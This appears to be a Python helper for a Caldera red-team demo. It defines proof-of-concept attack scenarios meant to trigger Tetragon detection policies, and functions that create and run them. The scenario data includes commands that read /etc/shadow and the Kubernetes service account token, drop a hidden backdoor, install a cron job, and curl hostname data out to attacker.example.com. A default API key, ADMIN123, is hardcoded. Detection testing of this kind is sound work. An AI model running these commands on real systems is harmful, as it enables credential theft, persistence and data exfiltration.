"""
Caldera C2 API helper.
All calls use the red-team API key (ADMIN123 by default).
"""
import os
import requests

CALDERA_URL = os.environ.get("CALDERA_URL", "http://caldera.piap.svc.cluster.local:8888")
API_KEY = os.environ.get("CALDERA_API_KEY", "ADMIN123")

# ── Demo scenario definitions ─────────────────────────────────────────────────
# Each scenario becomes one Caldera adversary with N abilities (atomic steps).
DEMO_SCENARIOS = [
    {
        "adversary_name": "PoC: Recon & Discovery",
        "description": "Gather system info, enumerate processes and open ports.",
        "tactic_tag": "discovery",
        "tetragon_policies": ["detect-shell-execution", "detect-network-tool"],
        "abilities": [
            {
                "name": "PoC - System Info",
                "tactic": "discovery",
                "technique_id": "T1082",
                "technique_name": "System Information Discovery",
                "command": "whoami && hostname && id && uname -a",
            },
            {
                "name": "PoC - Process Enumeration",
                "tactic": "discovery",
                "technique_id": "T1057",
                "technique_name": "Process Discovery",
                "command": "ps aux | head -30",
            },
            {
                "name": "PoC - Network Discovery",
                "tactic": "discovery",
                "technique_id": "T1049",
                "technique_name": "System Network Connections Discovery",
                "command": "ss -tulpn 2>/dev/null || netstat -an 2>/dev/null | head -30",
            },
        ],
    },
    {
        "adversary_name": "PoC: Credential Hunting",
        "description": "Attempt to read sensitive credential files and Kubernetes secrets.",
        "tactic_tag": "credential-access",
        "tetragon_policies": ["detect-sensitive-file-read", "detect-k8s-secret-access"],
        "abilities": [
            {
                "name": "PoC - Read /etc/passwd",
                "tactic": "credential-access",
                "technique_id": "T1003",
                "technique_name": "OS Credential Dumping",
                "command": "cat /etc/passwd | head -20",
            },
            {
                "name": "PoC - Read /etc/shadow",
                "tactic": "credential-access",
                "technique_id": "T1003",
                "technique_name": "OS Credential Dumping",
                "command": "cat /etc/shadow 2>/dev/null && echo 'shadow read!' || echo 'shadow: permission denied'",
            },
            {
                "name": "PoC - Read K8s Service Account Token",
                "tactic": "credential-access",
                "technique_id": "T1528",
                "technique_name": "Steal Application Access Token",
                "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-80 || echo 'token not found'",
            },
        ],
    },
    {
        "adversary_name": "PoC: Persistence",
        "description": "Install a backdoor script, add a cron job, and attempt C2 callback.",
        "tactic_tag": "persistence",
        "tetragon_policies": ["detect-shell-execution"],
        "abilities": [
            {
                "name": "PoC - Drop Backdoor Script",
                "tactic": "persistence",
                "technique_id": "T1059",
                "technique_name": "Command and Scripting Interpreter",
                "command": "mkdir -p /tmp/.hidden && printf '#!/bin/sh\\nwhoami\\nhostname\\n' > /tmp/.hidden/back.sh && chmod +x /tmp/.hidden/back.sh && echo 'backdoor dropped'",
            },
            {
                "name": "PoC - Install Cron Persistence",
                "tactic": "persistence",
                "technique_id": "T1053.005",
                "technique_name": "Scheduled Task/Job: Cron",
                "command": "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.hidden/back.sh') | crontab - 2>/dev/null && echo 'cron installed' || echo 'cron failed'",
            },
            {
                "name": "PoC - C2 Callback Attempt",
                "tactic": "command-and-control",
                "technique_id": "T1071.001",
                "technique_name": "Application Layer Protocol: Web Protocols",
                "command": "curl -s --max-time 3 http://attacker.example.com/exfil?h=$(hostname) 2>/dev/null || echo 'c2 unreachable (expected)'",
            },
        ],
    },
]


def _headers():
    return {"KEY": API_KEY, "Content-Type": "application/json"}


def is_available():
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers=_headers(), timeout=3)
        return r.status_code == 200
    except Exception:
        return False


def get_agents():
    r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers=_headers(), timeout=5)
    r.raise_for_status()
    return r.json()


def get_adversaries():
    r = requests.get(f"{CALDERA_URL}/api/v2/adversaries", headers=_headers(), timeout=5)
    r.raise_for_status()
    return [a for a in r.json() if a.get("name") and a.get("adversary_id")]


def get_operations():
    r = requests.get(f"{CALDERA_URL}/api/v2/operations", headers=_headers(), timeout=5)
    r.raise_for_status()
    return r.json()


def run_operation(name, adversary_id, group="red"):
    payload = {
        "name": name,
        "adversary": {"adversary_id": adversary_id},
        "group": group,
        "auto_close": False,
        "state": "running",
    }
    r = requests.post(
        f"{CALDERA_URL}/api/v2/operations",
        headers=_headers(),
        json=payload,
        timeout=10,
    )
    r.raise_for_status()
    return r.json()


def stop_operation(op_id):
    payload = {"state": "stop"}
    r = requests.patch(
        f"{CALDERA_URL}/api/v2/operations/{op_id}",
        headers=_headers(),
        json=payload,
        timeout=5,
    )
    r.raise_for_status()
    return r.json()


# ── Demo adversary setup ──────────────────────────────────────────────────────

def _create_ability(ability_def):
    """Create a single ability and return its ID."""
    payload = {
        "name": ability_def["name"],
        "description": ability_def["name"],
        "tactic": ability_def["tactic"],
        "technique_id": ability_def["technique_id"],
        "technique_name": ability_def["technique_name"],
        "executors": [
            {
                "name": "sh",
                "platform": "linux",
                "command": ability_def["command"],
            }
        ],
    }
    r = requests.post(
        f"{CALDERA_URL}/api/v2/abilities",
        headers=_headers(),
        json=payload,
        timeout=10,
    )
    r.raise_for_status()
    return r.json().get("ability_id") or r.json().get("id")


def _create_adversary(name, description, ability_ids):
    """Create an adversary from a list of ability IDs."""
    payload = {
        "name": name,
        "description": description,
        "atomic_ordering": [{"id": aid} for aid in ability_ids],
    }
    r = requests.post(
        f"{CALDERA_URL}/api/v2/adversaries",
        headers=_headers(),
        json=payload,
        timeout=10,
    )
    r.raise_for_status()
    return r.json()


def setup_demo_adversaries():
    """
    Create the 3 PoC adversaries (and their abilities) in Caldera.
    Skips any adversary whose name already exists.
    Returns a list of result messages.
    """
    existing = {a["name"] for a in get_adversaries()}
    messages = []

    for scenario in DEMO_SCENARIOS:
        if scenario["adversary_name"] in existing:
            messages.append(f"Already exists: {scenario['adversary_name']}")
            continue

        ability_ids = []
        for ab in scenario["abilities"]:
            aid = _create_ability(ab)
            ability_ids.append(aid)

        adv = _create_adversary(
            scenario["adversary_name"],
            scenario["description"],
            ability_ids,
        )
        messages.append(f"Created: {scenario['adversary_name']}")

    return messages


def get_demo_adversaries():
    """
    Return the 3 PoC adversary dicts if they exist in Caldera, else None for each.
    Result is a list parallel to DEMO_SCENARIOS.
    """
    all_adv = {a["name"]: a for a in get_adversaries()}
    result = []
    for scenario in DEMO_SCENARIOS:
        adv = all_adv.get(scenario["adversary_name"])
        result.append({
            "scenario": scenario,
            "adversary": adv,  # None if not yet created
        })
    return result
